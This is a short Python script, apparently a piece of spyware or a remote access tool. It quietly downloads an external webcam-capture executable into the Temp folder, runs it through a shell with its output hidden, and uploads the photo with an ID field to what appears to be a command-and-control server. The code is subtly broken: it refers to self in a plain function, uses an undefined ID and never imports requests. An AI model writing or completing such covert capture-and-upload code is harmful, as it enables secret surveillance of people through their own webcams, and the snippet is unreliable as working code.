import urllib.request, subprocess,os
CommandCamPath =  os.path.join(os.getenv('Temp'), 'CommandCam.exe')
CommandCamLink = 'https://raw.githubusercontent.com/tedburke/CommandCam/master/CommandCam.exe'

def WebcamScreenshot(File, Delay=10, Camera=1):
    if not os.path.exists(CommandCamPath):
        urllib.request.urlretrieve(CommandCamLink, CommandCamPath)

    Command = f'@{self.CommandCamPath} /filename \"{File}\" /delay {Delay} /devnum {Camera} > NUL'
    subprocess.call(Command, shell=True)


WebcamScreenshot("webcam.jpg")
data = {
    'ID':ID,
    'Type':"Screen"}
files = {'file': open('webcam.jpg','rb')}
print("sending screenshot")
r = requests.post('http://127.0.0.1:105/file', data=data,files=files)